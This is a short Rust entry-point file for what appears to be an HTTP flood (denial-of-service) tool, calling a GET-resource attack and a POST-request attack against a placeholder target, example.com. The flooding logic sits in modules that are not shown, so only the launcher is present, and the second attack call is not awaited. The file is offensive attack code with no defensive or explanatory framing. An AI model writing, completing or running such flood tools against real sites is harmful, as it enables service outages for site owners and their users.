use std::error::Error;

mod http_flood;
mod utils;

#[tokio::main]
async fn main() ->  Result<(),  Box<dyn Error>>{
    utils::show_logo();
    
    let site= "example.com";
    let url= format!("http://{site}");
    let times= 2;
    let http_flood= http_flood::HttpFlood::new(url, times);

    // Option 1
    http_flood.get_resource_attack().await;
    
    // Option 2
    http_flood.post_requeste_attack(utils::get_empty_text_data());

    Ok(())
}